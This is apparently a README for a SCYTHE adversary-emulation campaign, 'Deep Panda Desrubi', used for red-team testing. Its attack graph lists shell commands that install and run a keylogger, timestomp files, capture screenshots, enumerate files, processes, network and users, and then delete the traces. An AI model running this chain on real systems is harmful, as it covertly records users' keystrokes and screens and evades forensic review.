This threat is explained further in SCYTHE's Threat Thursday blog: https://www.scythe.io/library/threatthursday-deep-panda

To Emulate:

1. Download and import the threat in JSON format to your SCYTHE instance: https://github.com/scythe-io/community-threats/blob/master/DeepPanda/Deep_Panda_Desrubi_scythe_threat.json 
2. Go to the Threat Catalog and select "Deep Panda Desrubi"
3. Click "Create Campaign from Threat"
4. Name the Campaign
5. Parameters: Replace --cp unicorn.scythedemo.com:443 with your SCYTHE instance IP address or FQDN.
6. Launch the Campaign

 #Attack Graph

```mermaid
graph TD
Step0["<b> module: https </b> <br>"]
Step1["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load run </i> <br>"]
Step2["<b> module: run </b> <br><h4> parameters: </h4> <i> apt-get install logkeys </i> <br>"]
Step3["<b> module: run </b> <br><h4> parameters: </h4> <i> touch /tmp/log.txt </i> <br>"]
Step4["<b> module: run </b> <br><h4> parameters: </h4> <i> logkeys --start --output /tmp/log.txt </i> <br><a href='https://attack.mitre.org/techniques/T1056'>att&ck-technique:T1056</a><br>
"]
Step5["<b> module: run </b> <br><h4> parameters: </h4> <i> touch -a -t 197001010000.00 /tmp/timestomp </i> <br><a href='https://attack.mitre.org/techniques/T1099'>att&ck-technique:T1099</a><br>
"]
Step6["<b> module: run </b> <br><h4> parameters: </h4> <i> touch -m -t 197001010000.00 /tmp/timestomp </i> <br><a href='https://attack.mitre.org/techniques/T1099'>att&ck-technique:T1099</a><br>
"]
Step7["<b> module: run </b> <br><h4> parameters: </h4> <i> import -window root /tmp/shot.png </i> <br><a href='https://attack.mitre.org/techniques/T1113'>att&ck-technique:T1113</a><br>
"]
Step8["<b> module: run </b> <br><h4> parameters: </h4> <i> uname -a </i> <br><a href='https://attack.mitre.org/techniques/T1082'>att&ck-technique:T1082</a><br>
"]
Step9["<b> module: run </b> <br><h4> parameters: </h4> <i> cat /etc/lsb-release </i> <br><a href='https://attack.mitre.org/techniques/T1082'>att&ck-technique:T1082</a><br>
"]
Step10["<b> module: run </b> <br><h4> parameters: </h4> <i> uptime </i> <br><a href='https://attack.mitre.org/techniques/T1082'>att&ck-technique:T1082</a><br>
"]
Step11["<b> module: run </b> <br><h4> parameters: </h4> <i> cd $HOME && find . -print | sed -e s;[^/]*/;|__;g;s;__|; |;g > /tmp/T1083.txt </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1083'>att&ck-technique:T1083</a><br>
"]
Step12["<b> module: run </b> <br><h4> parameters: </h4> <i> if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi; </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1083'>att&ck-technique:T1083</a><br>
"]
Step13["<b> module: run </b> <br><h4> parameters: </h4> <i> find . -type f -iname *.pdf >> /tmp/T1083.txt </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1083'>att&ck-technique:T1083</a><br>
"]
Step14["<b> module: run </b> <br><h4> parameters: </h4> <i> find . -type f -name .* </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1083'>att&ck-technique:T1083</a><br>
"]
Step15["<b> module: run </b> <br><h4> parameters: </h4> <i> which sh </i> <br><a href='https://attack.mitre.org/techniques/T1083'>att&ck-technique:T1083</a><br>
"]
Step16["<b> module: run </b> <br><h4> parameters: </h4> <i> locate * </i> <br><a href='https://attack.mitre.org/techniques/T1083'>att&ck-technique:T1083</a><br>
"]
Step17["<b> module: run </b> <br><h4> parameters: </h4> <i> ps aux | less </i> <br><a href='https://attack.mitre.org/techniques/T1057'>att&ck-technique:T1057</a><br>
"]
Step18["<b> module: run </b> <br><h4> parameters: </h4> <i> netstat -tulpn </i> <br><a href='https://attack.mitre.org/techniques/T1057'>att&ck-technique:T1057</a><br>
"]
Step19["<b> module: run </b> <br><h4> parameters: </h4> <i> users </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1033'>att&ck-technique:T1033</a><br>
"]
Step20["<b> module: run </b> <br><h4> parameters: </h4> <i> w </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1033'>att&ck-technique:T1033</a><br>
"]
Step21["<b> module: run </b> <br><h4> parameters: </h4> <i> who </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1033'>att&ck-technique:T1033</a><br>
"]
Step22["<b> module: run </b> <br><h4> parameters: </h4> <i> rm -f /tmp/log.txt </i> <br><a href='https://attack.mitre.org/techniques/T1070'>att&ck-technique:T1070</a><br>
"]
Step23["<b> module: run </b> <br><h4> parameters: </h4> <i> rm -f /tmp/timestomp </i> <br>"]
Step24["<b> module: run </b> <br><h4> parameters: </h4> <i> rm -f /tmp/shot.png </i> <br>"]
Step25["<b> module: run </b> <br><h4> parameters: </h4> <i> rm -f /tmp/T1083.txt </i> <br>"]
Step0 --> Step1
Step1 --> Step2
Step2 --> Step3
Step3 --> Step4
Step4 --> Step5
Step5 --> Step6
Step6 --> Step7
Step7 --> Step8
Step8 --> Step9
Step9 --> Step10
Step10 --> Step11
Step11 --> Step12
Step12 --> Step13
Step13 --> Step14
Step14 --> Step15
Step15 --> Step16
Step16 --> Step17
Step17 --> Step18
Step18 --> Step19
Step19 --> Step20
Step20 --> Step21
Step21 --> Step22
Step22 --> Step23
Step23 --> Step24
Step24 --> Step25
Step25 --> Step26
```

